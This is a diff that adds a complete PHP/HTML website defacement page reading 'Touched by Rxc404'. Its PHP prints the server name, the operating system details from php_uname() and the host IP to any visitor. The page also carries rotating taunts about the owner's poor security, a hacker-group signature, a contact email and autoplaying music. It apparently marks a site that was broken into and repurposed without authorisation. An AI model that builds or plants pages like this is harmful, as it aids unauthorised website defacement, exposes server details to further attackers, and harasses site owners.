@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+   <head>
+    <?php $serverName = $_SERVER['SERVER_NAME'];
+      echo "<title>" . $serverName . " | Touched by Rxc404</title>";?>
+        <meta charset="UTF-8">
+     	<link rel="apple-touch-icon" sizes="180x180" href="https://s3.gifyu.com/images/id.gif">
+        <link rel="icon" type="image/png" sizes="32x32" href="https://s3.gifyu.com/images/id.gif">
+        <link rel="icon" type="image/png" sizes="16x16" href="https://s3.gifyu.com/images/id.gif">
+        <meta name="robots" content="index,follow">
+        <meta name="description" content="Rxc404 was here">
+        <meta name="keywords" content="Rxc404">
+        <meta name="author" content="Rxc404">
+        <meta name="googlebot" content="index,follow"/>
+        <meta name="robots" content="all"/>
+        <meta name="robots schedule" content="auto"/>
+        <meta name="distribution" content="global"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    </head>
+    <style>
+      body {
+        background-color: black;
+        background-image: url('https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/91cc6472-620a-4ad7-95ec-aee28a955e66/dczx23w-4f6e3b76-45e8-417a-84fc-32c871e0efe2.gif?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcLzkxY2M2NDcyLTYyMGEtNGFkNy05NWVjLWFlZTI4YTk1NWU2NlwvZGN6eDIzdy00ZjZlM2I3Ni00NWU4LTQxN2EtODRmYy0zMmM4NzFlMGVmZTIuZ2lmIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.O38EJ1pqs28Iu4RsyIIpnKdGTdTdlzjpZV_WADDwUq0');
+        background-size: cover;
+        color: white;
+        text-align: center;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+      p.small {
+      line-height: 1.0;
+      }
+      zar {
+        margin-left: 20px;
+        animation: fadeInOut 2.7s ease-in-out infinite;
+      }
+      
+      @keyframes fadeInOut
+      {
+        0% {
+          opacity: 0;
+        }
+        50% {
+          opacity: 1;
+        }
+        100% {
+          opacity: 0;
+        }
+      }
+  a:link {
+  color: cyan;
+  
+  text-decoration: none;
+}
+    </style>
+    <h1 style="font-family:Consolas;text-align: center;text-align-last: center;"><img src="https://bpjamsostek.com/gangguan.gif" width="50"/><br><zar>Touched By Rxc404<img src="https://s3.gifyu.com/images/id.gif" width="24"/></zar>
+        <br>
+        <font size='3' font face='Consolas' color='#ffffff' text-align='center'text-align-last= 'center'>
+            <font font face='Consolas' color="#40fa00" size="3px">[Server]</font><br>
+            <font font face='Arial' color="#ffffff" size="2px"><p class="small">
+            <?php echo php_uname();echo"<br>Host IP: " . $_SERVER['SERVER_ADDR'];?></font></p>
+            <font font face='Consolas' color="#40fa00" size="4px">[Message]</font>
+             <div class="typewrite" data-period="1000" data-type='["Rxc404 Was Here?!","is security available on your site sir? 🤔", "we hope you fix it soon✌️" ,"why i am here?","just noticed your security like a 💩","your site is not safe","improve your web security soon", "I will back again later to see if its been fixed", "©Member of WhiteCyberTeam Jawabarat🏳️"]'></div>
+            <a href="mailto:rxc404@gmail.com">Contact Me</a><br>
+        </font><audio controls autoplay loop controlsList="nodownload"><source src="https://l.top4top.io/m_26689i2as1.mp3" type="audio/mpeg"></audio>
+    </h1>
+  
+  <script>
+  var TxtType = function(el, toRotate, period) 
+  {
+    this.toRotate = toRotate;
+    this.el = el;
+    this.loopNum = 0;
+    this.period = parseInt(period, 10) || 2000;
+    this.txt = '';
+    this.tick();
+    this.isDeleting = false;
+ };
+ TxtType.prototype.tick = function() {
+    var i = this.loopNum % this.toRotate.length;
+    var fullTxt = this.toRotate[i];
+
+    if (this.isDeleting) {
+    this.txt = fullTxt.substring(0, this.txt.length - 1);
+    } else {
+    this.txt = fullTxt.substring(0, this.txt.length + 1);
+    }
+
+    this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
+
+    var that = this;
+    var delta = 160 - Math.random() * 100;
+
+    if (this.isDeleting) { delta /= 90; }
+
+    if (!this.isDeleting && this.txt === fullTxt) {
+    delta = this.period;
+    this.isDeleting = true;
+    } else if (this.isDeleting && this.txt === '') {
+    this.isDeleting = false;
+    this.loopNum++;
+    delta = 500;
+    }
+
+    setTimeout(function() {
+    that.tick();
+    }, delta);
+};
+
+window.onload = function() {
+    var elements = document.getElementsByClassName('typewrite');
+    for (var i=0; i<elements.length; i++) {
+        var toRotate = elements[i].getAttribute('data-type');
+        var period = elements[i].getAttribute('data-period');
+        if (toRotate) {
+          new TxtType(elements[i], JSON.parse(toRotate), period);
+        }
+    }
+    var css = document.createElement("style");
+    css.type = "text/css";
+    css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
+    document.body.appendChild(css);
+};
+ </script>
+ </body>
+</html>
